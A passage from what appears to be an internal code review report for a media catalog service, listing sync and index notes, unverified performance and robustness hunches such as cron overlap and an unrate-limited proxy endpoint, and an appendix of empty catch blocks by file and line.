- **Media-app sync.** Re-running a step is safe: a play within ±6 h of a stored one is not inserted twice (61_:569-576). Pushes to Stremio and Nuvio need `FF_MEDIA_APP_PUSH`. Collection edits are checked against a fresh pull before a write.
- **Indexes.** The hot lookups (`installs.token_hash`, `lists` owner and directory, `likes.voter`, `jobs (status, run_after)`, `support_messages.message_id`, `support_threads.customer_email`) are indexed.

## Unverified hunches
- **Cold catalog latency.** The baseline failure (cold p90 ~77 ms against a 40 ms budget, KV/D1 round trips within the guard) may be only this VM's speed, or real CPU growth on the cold path, for example from the recent catalog preview enrichment (`enrichCatalogPreviews`, commits 54edcc0 and 299f8f8). Worth one profile on an idle machine.
- **Overlapping cron ticks without the queue.** `runLegacyCronTasks` has no lease. A tick that runs longer than the 5-6 minute trigger interval could overlap the next one and run the episode sweep twice. Probably harmless (cursor-based), but not traced.
- **Channel presets run twice without the queue.** `runLegacyCronTasks` calls `prewarmChannelPresets` every tick, and `runDueJobsInline` also runs the daily `channel.presets` job. Extra TMDB calls only.
- **A negative `skip`.** `skip=-20` in a catalog URL parses to −20 (`parseInt(extra.skip, 10) || 0`); whether every source clamps it was not checked.
- **`/api/mdblist-history-raw`.** It is public and makes up to `MAX_PAGES` (10) × 2 MDBList calls per request (src/api/25_api-catalog-routes.js:7574) with the caller's own key. Abuse would cost the caller's quota, not the site's, but it is a request amplifier with no rate limit.

## Appendix: swallowing catches (BA-008)
Every `try` block in `src/core`, `src/api`, `src/catalog`, `src/data`, `src/jobs` and `src/admin` whose `catch` is empty or comment-only and that wraps four or more lines of code (203). The range is `try` line to `catch` line.

<details><summary>Show the list</summary>

- `src/admin/03_admin.js:78-104` (10 code lines)
- `src/admin/03_admin.js:120-140` (13 code lines)
- `src/admin/03_admin.js:168-178` (9 code lines)
- `src/admin/03_admin.js:183-198` (14 code lines)
- `src/admin/03_admin.js:260-265` (4 code lines)
- `src/admin/03_admin.js:507-516` (8 code lines)
- `src/admin/03_admin.js:540-622` (43 code lines)
- `src/admin/03_admin.js:681-690` (8 code lines)
- `src/admin/03_admin.js:825-846` (20 code lines)
- `src/admin/03_admin.js:899-973` (45 code lines)
- `src/admin/03_admin.js:1075-1103` (24 code lines)
- `src/admin/03_admin.js:1293-1312` (18 code lines)
- `src/admin/03_admin.js:1470-1475` (4 code lines)
- `src/admin/03_admin.js:1519-1536` (11 code lines)
- `src/admin/03_admin.js:1562-1570` (7 code lines)
- `src/admin/03_admin.js:1583-1595` (8 code lines)
- `src/admin/03_admin.js:2391-2405` (10 code lines)
- `src/admin/03_admin.js:2556-2563` (6 code lines)
- `src/admin/03_admin.js:3538-3543` (4 code lines)
- `src/admin/03_admin.js:3706-3711` (4 code lines)
- `src/admin/03_admin.js:6065-6074` (8 code lines)
- `src/admin/03_admin.js:6093-6098` (4 code lines)
- `src/api/25_api-catalog-routes.js:803-826` (22 code lines)
- `src/api/25_api-catalog-routes.js:914-919` (4 code lines)
- `src/api/25_api-catalog-routes.js:1187-1206` (18 code lines)
- `src/api/25_api-catalog-routes.js:1701-1707` (5 code lines)
- `src/api/25_api-catalog-routes.js:1738-1748` (5 code lines)
- `src/api/25_api-catalog-routes.js:1808-1820` (10 code lines)
- `src/api/25_api-catalog-routes.js:1954-1960` (5 code lines)
- `src/api/25_api-catalog-routes.js:2437-2452` (14 code lines)
- `src/api/25_api-catalog-routes.js:2458-2540` (76 code lines)
- `src/api/25_api-catalog-routes.js:2501-2515` (13 code lines)
- `src/api/25_api-catalog-routes.js:2628-2648` (19 code lines)
- `src/api/25_api-catalog-routes.js:2653-2661` (7 code lines)
- `src/api/25_api-catalog-routes.js:2669-2682` (12 code lines)
- `src/api/25_api-catalog-routes.js:2687-2700` (12 code lines)
- `src/api/25_api-catalog-routes.js:3289-3298` (8 code lines)
- `src/api/25_api-catalog-routes.js:3384-3400` (8 code lines)
- `src/api/25_api-catalog-routes.js:3553-3565` (9 code lines)
- `src/api/25_api-catalog-routes.js:3911-3963` (48 code lines)
- `src/api/25_api-catalog-routes.js:4110-4120` (9 code lines)
- `src/api/25_api-catalog-routes.js:4124-4142` (16 code lines)
- `src/api/25_api-catalog-routes.js:4148-4170` (13 code lines)
- `src/api/25_api-catalog-routes.js:4295-4309` (13 code lines)
- `src/api/25_api-catalog-routes.js:4420-4432` (11 code lines)
- `src/api/25_api-catalog-routes.js:4440-4450` (9 code lines)
- `src/api/25_api-catalog-routes.js:4543-4555` (11 code lines)
- `src/api/25_api-catalog-routes.js:4562-4577` (14 code lines)
- `src/api/25_api-catalog-routes.js:4750-4765` (14 code lines)
- `src/api/25_api-catalog-routes.js:4824-4831` (6 code lines)
- `src/api/25_api-catalog-routes.js:4835-4841` (5 code lines)
- `src/api/25_api-catalog-routes.js:5196-5215` (18 code lines)
- `src/api/25_api-catalog-routes.js:5555-5567` (11 code lines)
- `src/api/25_api-catalog-routes.js:5868-5891` (22 code lines)
- `src/api/25_api-catalog-routes.js:6031-6036` (4 code lines)
- `src/api/25_api-catalog-routes.js:6063-6070` (6 code lines)
- `src/api/25_api-catalog-routes.js:6092-6106` (13 code lines)
- `src/api/25_api-catalog-routes.js:6321-6335` (13 code lines)
- `src/api/25_api-catalog-routes.js:6347-6361` (13 code lines)
- `src/api/25_api-catalog-routes.js:6374-6605` (214 code lines)
- `src/api/25_api-catalog-routes.js:6529-6602` (63 code lines)
- `src/api/25_api-catalog-routes.js:6620-6676` (53 code lines)
- `src/api/25_api-catalog-routes.js:6987-6992` (4 code lines)
- `src/api/25_api-catalog-routes.js:7033-7057` (23 code lines)
- `src/api/25_api-catalog-routes.js:7295-7306` (10 code lines)
- `src/api/25_api-catalog-routes.js:7331-7488` (150 code lines)
- `src/api/25_api-catalog-routes.js:7559-7567` (7 code lines)
- `src/api/26_api-creator-and-admin-routes.js:541-576` (32 code lines)
- `src/api/26_api-creator-and-admin-routes.js:546-554` (7 code lines)
- `src/api/26_api-creator-and-admin-routes.js:606-657` (41 code lines)
- `src/api/26_api-creator-and-admin-routes.js:716-733` (15 code lines)
- `src/api/26_api-creator-and-admin-routes.js:770-778` (7 code lines)
- `src/api/26_api-creator-and-admin-routes.js:789-795` (5 code lines)
- `src/api/26_api-creator-and-admin-routes.js:943-950` (5 code lines)
- `src/api/26_api-creator-and-admin-routes.js:971-1009` (37 code lines)
- `src/api/26_api-creator-and-admin-routes.js:1013-1021` (7 code lines)
- `src/api/26_api-creator-and-admin-routes.js:1073-1081` (7 code lines)
- `src/api/26_api-creator-and-admin-routes.js:1085-1092` (6 code lines)
- `src/api/26_api-creator-and-admin-routes.js:1097-1125` (27 code lines)
- `src/api/26_api-creator-and-admin-routes.js:1313-1343` (28 code lines)
- `src/api/26_api-creator-and-admin-routes.js:1318-1326` (7 code lines)
- `src/api/26_api-creator-and-admin-routes.js:1649-1657` (7 code lines)
- `src/api/26_api-creator-and-admin-routes.js:2426-2438` (11 code lines)
- `src/api/26_api-creator-and-admin-routes.js:2442-2456` (13 code lines)
- `src/api/26_api-creator-and-admin-routes.js:3307-3316` (8 code lines)
- `src/api/26_api-creator-and-admin-routes.js:3691-3699` (7 code lines)
- `src/api/26_api-creator-and-admin-routes.js:3737-3747` (7 code lines)
- `src/api/26_api-creator-and-admin-routes.js:3928-4053` (77 code lines)
- `src/api/26_api-creator-and-admin-routes.js:4063-4112` (48 code lines)
- `src/api/26_api-creator-and-admin-routes.js:4122-4149` (26 code lines)
- `src/api/26_api-creator-and-admin-routes.js:4379-4386` (6 code lines)
- `src/api/26_api-creator-and-admin-routes.js:4427-4434` (6 code lines)
- `src/api/26_api-creator-and-admin-routes.js:4530-4544` (13 code lines)
- `src/api/26_api-creator-and-admin-routes.js:4679-4685` (5 code lines)
- `src/api/26_api-creator-and-admin-routes.js:4747-4768` (20 code lines)
- `src/api/26_api-creator-and-admin-routes.js:4822-4866` (40 code lines)
- `src/api/26_api-creator-and-admin-routes.js:4881-4887` (5 code lines)
- `src/api/26_api-creator-and-admin-routes.js:5427-5436` (8 code lines)
- `src/api/26_api-creator-and-admin-routes.js:5461-5467` (5 code lines)
- `src/api/26_api-creator-and-admin-routes.js:5482-5506` (17 code lines)
- `src/api/26_api-creator-and-admin-routes.js:5744-5765` (20 code lines)
- `src/api/26_api-creator-and-admin-routes.js:5779-5797` (17 code lines)
- `src/api/26_api-creator-and-admin-routes.js:6193-6200` (4 code lines)
- `src/api/26_api-creator-and-admin-routes.js:6735-6759` (23 code lines)
- `src/api/26_api-creator-and-admin-routes.js:7290-7300` (9 code lines)
- `src/api/26_api-creator-and-admin-routes.js:7773-7778` (4 code lines)
- `src/api/27_installs.js:396-405` (8 code lines)
- `src/api/28_connections.js:188-213` (24 code lines)
- `src/api/28_connections.js:530-558` (27 code lines)
- `src/api/61_media-app-sync.js:1615-1622` (6 code lines)
- `src/catalog/05_catalog-core.js:1218-1226` (7 code lines)
- `src/catalog/05_catalog-core.js:1276-1281` (4 code lines)
- `src/catalog/05_catalog-core.js:1364-1371` (6 code lines)
- `src/catalog/05_catalog-core.js:1457-1472` (14 code lines)
- `src/catalog/05_catalog-core.js:1477-1489` (11 code lines)
- `src/catalog/05_catalog-core.js:1500-1509` (8 code lines)
- `src/catalog/05_catalog-core.js:1934-1945` (10 code lines)
- `src/catalog/05_catalog-core.js:2045-2065` (13 code lines)
- `src/catalog/05_catalog-core.js:2230-2241` (10 code lines)
- `src/catalog/05_catalog-core.js:2300-2306` (5 code lines)
- `src/catalog/05_catalog-core.js:2363-2376` (12 code lines)
- `src/catalog/05_catalog-core.js:2432-2450` (17 code lines)
- `src/catalog/05_catalog-core.js:2650-2656` (5 code lines)
- `src/catalog/05_catalog-core.js:2763-2773` (9 code lines)
- `src/catalog/05_catalog-core.js:3121-3127` (5 code lines)
- `src/catalog/05_catalog-core.js:4475-4485` (9 code lines)
- `src/catalog/06_source-fetchers-mdblist-trakt.js:343-372` (28 code lines)
- `src/catalog/06_source-fetchers-mdblist-trakt.js:405-423` (17 code lines)
- `src/catalog/06_source-fetchers-mdblist-trakt.js:429-453` (23 code lines)
- `src/catalog/06_source-fetchers-mdblist-trakt.js:852-930` (66 code lines)
- `src/catalog/06_source-fetchers-mdblist-trakt.js:987-1010` (22 code lines)
- `src/catalog/06_source-fetchers-mdblist-trakt.js:1063-1068` (4 code lines)
- `src/catalog/06_source-fetchers-mdblist-trakt.js:1071-1076` (4 code lines)
- `src/catalog/06_source-fetchers-mdblist-trakt.js:1079-1084` (4 code lines)
- `src/catalog/06_source-fetchers-mdblist-trakt.js:1109-1132` (22 code lines)
- `src/catalog/06_source-fetchers-mdblist-trakt.js:1370-1417` (38 code lines)
- `src/catalog/07_source-fetchers-tmdb-simkl.js:163-197` (25 code lines)
- `src/catalog/07_source-fetchers-tmdb-simkl.js:412-427` (14 code lines)
- `src/catalog/07_source-fetchers-tmdb-simkl.js:436-443` (6 code lines)
- `src/catalog/07_source-fetchers-tmdb-simkl.js:1141-1151` (9 code lines)
- `src/catalog/07_source-fetchers-tmdb-simkl.js:1377-1391` (13 code lines)
- `src/catalog/07_source-fetchers-tmdb-simkl.js:1857-1865` (7 code lines)
- `src/catalog/07_source-fetchers-tmdb-simkl.js:2015-2021` (5 code lines)
- `src/catalog/07_source-fetchers-tmdb-simkl.js:2163-2174` (10 code lines)
- `src/catalog/07_source-fetchers-tmdb-simkl.js:2616-2627` (10 code lines)
- `src/catalog/07_source-fetchers-tmdb-simkl.js:2716-2724` (7 code lines)
- `src/catalog/07_source-fetchers-tmdb-simkl.js:2767-2776` (8 code lines)
- `src/catalog/07_source-fetchers-tmdb-simkl.js:2785-2826` (37 code lines)
- `src/catalog/07_source-fetchers-tmdb-simkl.js:3558-3565` (6 code lines)
- `src/catalog/07_source-fetchers-tmdb-simkl.js:3573-3585` (11 code lines)
- `src/catalog/07_source-fetchers-tmdb-simkl.js:3604-3629` (23 code lines)
- `src/catalog/07_source-fetchers-tmdb-simkl.js:3713-3736` (22 code lines)
- `src/catalog/07_source-fetchers-tmdb-simkl.js:3910-3925` (14 code lines)
- `src/catalog/07_source-fetchers-tmdb-simkl.js:4015-4033` (17 code lines)
- `src/catalog/07_source-fetchers-tmdb-simkl.js:4073-4090` (16 code lines)
- `src/catalog/07_source-fetchers-tmdb-simkl.js:4111-4138` (26 code lines)
- `src/catalog/07_source-fetchers-tmdb-simkl.js:4188-4203` (14 code lines)
- `src/catalog/07_source-fetchers-tmdb-simkl.js:4306-4317` (10 code lines)
- `src/catalog/07_source-fetchers-tmdb-simkl.js:4357-4375` (17 code lines)
- `src/catalog/07_source-fetchers-tmdb-simkl.js:4470-4482` (11 code lines)
- `src/catalog/07_source-fetchers-tmdb-simkl.js:4486-4509` (22 code lines)
- `src/catalog/07_source-fetchers-tmdb-simkl.js:4781-4787` (5 code lines)
- `src/catalog/07_source-fetchers-tmdb-simkl.js:5173-5179` (5 code lines)
- `src/catalog/07_source-fetchers-tmdb-simkl.js:5249-5255` (5 code lines)
- `src/catalog/41_provider-breaker.js:186-195` (6 code lines)
- `src/catalog/41_provider-breaker.js:223-229` (5 code lines)
- `src/catalog/57_title-details-fallback.js:41-48` (6 code lines)
- `src/core/01_icon-asset.js:1397-1404` (6 code lines)
- `src/core/02_http-and-creator-utils.js:307-315` (7 code lines)
- `src/core/02_http-and-creator-utils.js:604-617` (10 code lines)
- `src/core/02_http-and-creator-utils.js:1519-1524` (4 code lines)
- `src/core/02_http-and-creator-utils.js:1649-1660` (10 code lines)
- `src/core/02_http-and-creator-utils.js:1840-1848` (7 code lines)
- `src/core/02_http-and-creator-utils.js:1851-1856` (4 code lines)
- `src/core/02_http-and-creator-utils.js:1917-1923` (5 code lines)
- `src/core/02_http-and-creator-utils.js:2810-2820` (9 code lines)
- `src/core/02_http-and-creator-utils.js:2826-2839` (12 code lines)
- `src/core/02_http-and-creator-utils.js:2899-2912` (12 code lines)
- `src/core/02_http-and-creator-utils.js:3401-3406` (4 code lines)
- `src/core/02_http-and-creator-utils.js:3455-3468` (9 code lines)
- `src/core/02_http-and-creator-utils.js:3526-3533` (6 code lines)
- `src/core/02_http-and-creator-utils.js:3544-3551` (6 code lines)
- `src/core/02_http-and-creator-utils.js:3650-3658` (7 code lines)
- `src/core/02_http-and-creator-utils.js:3775-3784` (7 code lines)
- `src/core/02_http-and-creator-utils.js:3965-3971` (5 code lines)
- `src/core/02_http-and-creator-utils.js:4618-4623` (4 code lines)
- `src/core/02_http-and-creator-utils.js:4707-4716` (6 code lines)
- `src/core/02_http-and-creator-utils.js:5387-5394` (6 code lines)
- `src/core/02_http-and-creator-utils.js:5625-5636` (10 code lines)
- `src/core/02_http-and-creator-utils.js:5802-5807` (4 code lines)
- `src/core/02_http-and-creator-utils.js:6364-6373` (6 code lines)
- `src/core/02_http-and-creator-utils.js:6568-6579` (10 code lines)
- `src/core/02_http-and-creator-utils.js:6814-6831` (13 code lines)
- `src/core/02_http-and-creator-utils.js:6877-6887` (9 code lines)
- `src/core/04_config-resolution.js:37-154` (79 code lines)
- `src/core/04_config-resolution.js:117-131` (13 code lines)
- `src/data/34_lists-v2-bridge.js:226-231` (4 code lines)
- `src/jobs/44_jobs-queue.js:271-277` (5 code lines)
- `src/jobs/44_jobs-queue.js:334-339` (4 code lines)
- `src/jobs/45_jobs-dispatcher.js:452-458` (5 code lines)
- `src/jobs/47_shelf-shadow.js:472-478` (5 code lines)
- `src/jobs/52_poster-fetch.js:55-63` (7 code lines)
- `src/jobs/52_poster-fetch.js:113-120` (6 code lines)

</details>
